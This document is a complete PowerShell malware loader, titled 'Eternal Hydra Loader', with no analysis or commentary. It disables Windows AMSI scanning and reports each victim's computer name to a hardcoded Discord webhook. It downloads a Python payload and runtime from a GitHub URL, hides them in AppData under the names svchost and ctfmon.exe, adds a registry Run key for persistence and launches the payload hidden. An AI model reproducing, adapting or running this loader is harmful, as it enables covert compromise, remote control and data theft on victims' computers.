# --- THE ETERNAL HYDRA LOADER (V14.0 - FULL LOCK-IN) ---
# 0. BLIND THE WATCHDOG (AMSI BYPASS)
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,$null)}}}}

$WEBHOOK = "https://discord.com/api/webhooks/1505044718797586577/-gbKCGDVp0tz3RjJl3IfaTTU1xuu3ZBP4fmrL-jq_s0NbA_1iB8zFM0BURGTRTQcZg8U"
function Send-Ghost { param($msg) try { $json = @{content="**[GHOST STATUS | $($env:COMPUTERNAME)]** $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

$ID = "svchost"
$Path = "$env:APPDATA\$ID"
$PY_MASK = "$Path\python\ctfmon.exe"

# 1. CLEANING OLD SKIN
if (Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue) { Stop-Process -Name "ctfmon" -Force }
if (!(Test-Path $Path)) { md $Path > $null }

# 2. LANDING THE HYDRA
Send-Ghost "Evolution Triggered: Landing V14.0 Core Engine..."
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"

# Synchronous Land
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
$zipPath = "$Path\mui_cache.zip"
Invoke-WebRequest -Uri $Z_URL -OutFile $zipPath

# Safe Extraction (Overwrite enabled)
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
foreach ($entry in $zip.Entries) {
    $target = [System.IO.Path]::Combine($Path, $entry.FullName)
    if ($target.EndsWith("\")) { if (!(Test-Path $target)) { md $target > $null } }
    else {
        if (!(Test-Path ([System.IO.Path]::GetDirectoryName($target)))) { md ([System.IO.Path]::GetDirectoryName($target)) > $null }
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $target, $true)
    }
}
$zip.Dispose()
Remove-Item $zipPath -Force

# 3. PERSISTENCE (Registry Run Key - The Old Reliable)
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegPath -Name $ID -Value "`"$PY_MASK`" `"$Path\WinServices.py`""

# 4. ENGAGE
Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`"" -WorkingDirectory $Path -WindowStyle Hidden
Send-Ghost "The Eternal Hydra v14.0 is live. Shadow Protocol engaged."
